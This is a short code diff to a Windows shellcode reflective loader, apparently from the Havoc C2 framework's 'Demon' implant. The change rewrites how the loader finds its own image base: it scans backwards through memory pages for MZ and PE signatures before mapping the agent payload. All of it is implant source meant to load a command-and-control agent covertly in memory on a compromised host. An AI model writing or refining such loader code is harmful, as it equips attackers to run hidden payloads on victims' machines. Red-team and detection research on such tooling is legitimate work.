@@ -39,8 +39,22 @@ SEC( text, B ) VOID Entry( VOID )
 
     if ( NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
     {
-        // TODO: find the base address of this shellcode in a better way?
-        KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
+        // Walk backwards page-by-page looking for the MZ signature
+        // to find the actual image base (blind page-alignment is unreliable)
+        KaynArgs.KaynLdr = KaynLibraryLdr;
+        for ( INT_PTR i = 0; i < 32; i++ )
+        {
+            PVOID Candidate = ( PVOID )( ( ( ULONG_PTR )KaynLibraryLdr & ~( ULONG_PTR )( PAGE_SIZE - 1 ) ) - ( i * PAGE_SIZE ) );
+            if ( *( PWORD )Candidate == 0x5A4D )
+            {
+                PIMAGE_NT_HEADERS CheckNt = C_PTR( Candidate + ( ( PIMAGE_DOS_HEADER )Candidate )->e_lfanew );
+                if ( CheckNt->Signature == IMAGE_NT_SIGNATURE )
+                {
+                    KaynArgs.KaynLdr = Candidate;
+                    break;
+                }
+            }
+        }
         KaynArgs.DllCopy   = KaynLibraryLdr;
         KaynArgs.Demon     = KVirtualMemory;
         KaynArgs.DemonSize = KMemSize;
